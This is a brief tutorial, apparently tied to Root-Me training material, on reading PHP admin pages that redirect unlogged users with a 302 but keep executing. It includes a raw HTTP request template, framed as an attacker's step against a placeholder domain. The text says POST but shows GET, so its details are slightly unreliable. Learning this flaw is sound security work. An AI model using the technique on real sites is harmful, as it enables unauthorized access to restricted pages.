We'll see how to exploit a php flaw to access restricted page under a login redirection :



I. Context :

PHP web-apps controll access to internal restricted pages by redirecting unlogged user to another page (often login or index)
This redirection is under the '302 Found' HTTP code. In PHP, this response code does not stop the execution of the code written in the restricted page. Thus, we can exploit this flaw by
sending a HTTP POST req and displaying the result (with burp for instance)




II. Exploitation :

Imagine that you are an attacker and you want to access to http://www.vulnerable123.com/admin/main.php which is a restricted file.
You can use burpsuite to request the file : 

GET admin/main.php HTTP/1.1
Host: www.vulnerable123.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

And then you just have to look the result to see the restricted page content.





Ressource :
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf?_gl=1*5lk3rm*_ga*NDQyMjcxODA1LjE2NjY2OTg5ODg.*_ga_SRYSKX09J7*MTY3NzY5MjQ2Ni4yNC4xLjE2Nzc2OTQ1MDkuMC4wLjA.
